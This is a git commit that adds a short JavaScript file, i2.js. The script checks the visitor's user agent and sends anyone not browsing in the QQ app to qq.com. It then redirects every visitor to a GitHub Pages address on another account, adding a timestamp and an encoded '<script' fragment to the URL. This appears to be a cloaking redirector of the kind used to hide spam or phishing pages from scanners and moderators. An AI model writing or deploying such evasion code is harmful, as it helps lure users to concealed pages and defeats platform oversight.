3ae74930badd3e86daf4fbd156414ea981578f4c
iuuc <145624790+iuuc@users.noreply.github.com>
2023-12-31 10:02:05 +0800

    Create i2.js

---
+++ i2.js
@@ -0,0 +1,15 @@
+function leleua() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
+    } else {
+        window.location.href = "https://qq.com";
+    }
+}
+
+leleua();
+
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://teezx.github.io./index.html' + '?' + timestamp + '%3Cscript';
+    location.href = url;
+}, 1000);
